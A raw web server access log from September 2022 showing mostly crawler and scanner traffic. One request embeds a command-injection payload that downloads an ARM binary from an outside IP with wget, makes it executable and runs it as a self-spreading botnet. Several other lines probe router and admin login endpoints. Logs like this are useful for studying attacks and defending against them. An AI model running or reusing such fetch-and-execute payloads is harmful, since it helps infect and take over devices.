+92.118.39.88 - - [07/Sep/2022:02:55:40 +0500] "GET / HTTP/1.1" 200 487 "-" "-"
+174.88.206.105 - - [07/Sep/2022:03:10:53 +0500] "GET /shell?cd+/tmp;+wget+http:/\\/45.137.206.157/idk/home.arm;+chmod+777+home.arm;+./home.arm Jaws.Selfrep;rm+-rf+home.arm" 400 392 "-" "-"
+13.57.254.215 - - [07/Sep/2022:03:23:48 +0500] "GET / HTTP/1.1" 200 365 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MDDCJS)"
+198.235.24.181 - - [07/Sep/2022:03:37:04 +0500] "\x16\x03\x01" 400 392 "-" "-"
+23.231.12.112 - - [07/Sep/2022:03:45:56 +0500] "GET / HTTP/1.1" 301 463 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 YaBrowser/22.7.0 Yowser/2.5 Safari/537.36"
+23.231.12.112 - - [07/Sep/2022:03:46:00 +0500] "GET / HTTP/1.1" 200 4972 "http://zp174.ru" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 YaBrowser/22.7.0 Yowser/2.5 Safari/537.36"
+97.74.229.113 - - [07/Sep/2022:03:56:18 +0500] "GET /admin//config.php HTTP/1.1" 404 4855 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.27.1 zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
+181.214.206.161 - - [07/Sep/2022:03:59:23 +0500] "OPTIONS / HTTP/1.1" 200 421 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17"
+120.83.231.169 - - [07/Sep/2022:04:02:10 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+162.55.86.61 - - [07/Sep/2022:04:13:24 +0500] "GET /robots.txt HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+162.55.86.61 - - [07/Sep/2022:04:13:25 +0500] "GET /robots.txt HTTP/1.1" 404 5152 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+162.55.86.61 - - [07/Sep/2022:04:13:30 +0500] "GET /sitemap HTTP/1.1" 301 477 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+162.55.86.61 - - [07/Sep/2022:04:13:31 +0500] "GET /robots.txt HTTP/1.1" 404 5152 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+162.55.86.61 - - [07/Sep/2022:04:13:35 +0500] "GET /sitemap HTTP/1.1" 404 5152 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+162.55.86.61 - - [07/Sep/2022:04:13:39 +0500] "GET /sitemap HTTP/1.1" 404 5152 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+162.55.86.61 - - [07/Sep/2022:04:13:43 +0500] "GET /sitemap.txt HTTP/1.1" 301 485 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+162.55.86.61 - - [07/Sep/2022:04:13:43 +0500] "GET /sitemap.txt HTTP/1.1" 404 5152 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+162.55.86.61 - - [07/Sep/2022:04:13:47 +0500] "GET /sitemap.txt HTTP/1.1" 404 5152 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
+156.219.69.255 - - [07/Sep/2022:05:03:16 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+188.166.79.129 - - [07/Sep/2022:05:17:23 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+222.186.19.235 - - [07/Sep/2022:05:27:00 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+222.186.19.235 - - [07/Sep/2022:05:27:00 +0500] "GET / HTTP/1.0" 400 528 "-" "-"
+109.206.241.219 - - [07/Sep/2022:05:38:57 +0500] "POST /boaform/admin/formLogin HTTP/1.1" 404 397 "http://2.57.187.139:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
+95.161.131.237 - - [07/Sep/2022:05:42:52 +0500] "GET /config/getuser?index=0 HTTP/1.1" 404 360 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
+178.79.169.97 - - [07/Sep/2022:05:44:55 +0500] "GET / HTTP/1.1" 200 4931 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
+31.220.1.83 - - [07/Sep/2022:06:11:12 +0500] "GET / HTTP/1.1" 200 365 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+178.46.160.112 - - [07/Sep/2022:06:14:06 +0500] "GET /arduino/css.css HTTP/1.1" 301 493 "http://192.168.100.3:65535/yvl5pxSW_WVQ4SPe/index.html" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+178.46.160.112 - - [07/Sep/2022:06:14:06 +0500] "GET /arduino/jquery-3.5.0.min.js HTTP/1.1" 301 517 "http://192.168.100.3:65535/yvl5pxSW_WVQ4SPe/index.html" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+178.46.160.112 - - [07/Sep/2022:06:14:06 +0500] "GET /arduino/js.js HTTP/1.1" 301 489 "http://192.168.100.3:65535/yvl5pxSW_WVQ4SPe/index.html" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+178.46.160.112 - - [07/Sep/2022:06:14:07 +0500] "GET /arduino/css.css HTTP/1.1" 200 5393 "http://192.168.100.3:65535/yvl5pxSW_WVQ4SPe/index.html" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+178.46.160.112 - - [07/Sep/2022:06:14:07 +0500] "GET /arduino/js.js HTTP/1.1" 200 5474 "http://192.168.100.3:65535/yvl5pxSW_WVQ4SPe/index.html" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+178.46.160.112 - - [07/Sep/2022:06:14:07 +0500] "GET /arduino/jquery-3.5.0.min.js HTTP/1.1" 200 35931 "http://192.168.100.3:65535/yvl5pxSW_WVQ4SPe/index.html" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+::1 - - [07/Sep/2022:06:14:14 +0500] "OPTIONS * HTTP/1.0" 200 110 "-" "Apache/2.4.52 (Debian) OpenSSL/1.1.1k (internal dummy connection)"
+5.188.210.227 - - [07/Sep/2022:06:20:19 +0500] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 360 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
+1662546102.929     50 192.168.13.128 TCP_REFRESH_MODIFIED/200 15821 GET http://7kas.sudrf.ru/themes/mobile/style/jquery-ui.structure.min.css - HIER_DIRECT/84.42.111.139 text/css
